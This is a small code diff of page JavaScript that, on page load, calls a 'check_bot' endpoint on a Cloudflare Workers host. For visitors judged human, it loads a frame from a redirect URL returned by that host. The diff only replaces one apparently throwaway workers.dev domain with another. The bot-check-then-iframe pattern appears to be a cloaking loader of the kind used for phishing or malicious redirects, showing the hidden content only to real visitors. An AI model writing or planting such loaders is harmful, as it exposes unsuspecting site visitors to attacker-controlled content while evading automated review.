@@ -21,7 +21,7 @@ createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
     
-    fetch('https://proxy_cf.pointg.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
+    fetch('https://proxy_cf.opaopaopppa.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
             createFrame(res.url_red + 'NVQVZ4')
         } else {
